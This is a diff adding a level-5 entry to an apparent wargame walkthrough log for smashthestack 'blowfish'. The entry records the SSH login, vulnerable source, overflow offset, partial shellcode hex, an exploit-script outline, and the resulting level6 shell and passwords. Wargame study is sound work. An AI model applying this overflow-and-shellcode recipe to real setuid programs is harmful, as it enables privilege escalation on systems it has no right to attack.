@@ -147,6 +147,69 @@
     }
    ],
    "note": "strcpy overflow, ASLR off + RWE stack. /tmp is quota-blocked for levelN users - work in /dev/shm. python 2.5.2 only on the box. Verified live 2026-11-25."
+  },
+  {
+   "lvl": 5,
+   "user": "level5",
+   "pw": "yummy_bluntz",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level5@blowfish.smashthestack.org",
+     "out": [
+      "level5@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "This level is a stack overflow in /levels/level5.",
+      "Exploit to get the level6 pass from /pass/level6."
+     ]
+    },
+    {
+     "cmd": "cat /levels/level5.c",
+     "out": [
+      "char buffer[1024]; if (getenv(\"VULN\") == NULL) exit(1); strcpy(buffer, (char *)getenv(\"VULN\"));"
+     ]
+    },
+    {
+     "cmd": "objdump -d --no-show-raw-insn /levels/level5 | sed -n '/<main>:/,/ret/p'",
+     "out": [
+      "lea -0x408(%ebp),%eax ... call strcpy@plt",
+      "(buf at ebp-0x408 -> ret at offset 1036)"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/l5bf.asm",
+     "out": [
+      "(55-byte NUL-free setuid shellcode, same as L4)",
+      "[New] written"
+     ]
+    },
+    {
+     "cmd": "nasm -f elf32 /dev/shm/l5bf.asm -o /dev/shm/l5bf.o && objcopy -O binary --only-section=.text ... && xxd -p",
+     "out": [
+      "31c0b0c9cd8089c3...bcd80",
+      "55 /dev/shm/l5bf.bin"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf5.py",
+     "out": [
+      "(VULN = A*1036 + ret + 2000-byte NOP sled + shellcode; descending pipe-probe 0xbffffd00..0xbffffb00)",
+      "[New] 85L written"
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/e_bf5.py",
+     "out": [
+      "landed in the shellcode at 0xbffffcf8",
+      "uid=1006(level6) gid=1005(level5) groups=1005(level5)",
+      "ur_so_l33t"
+     ]
+    }
+   ],
+   "note": "Environment-based strcpy overflow via VULN. Same shellcode/probe recipe as L4. Verified live 2026-11-25."
   }
  ],
  "goals": {}
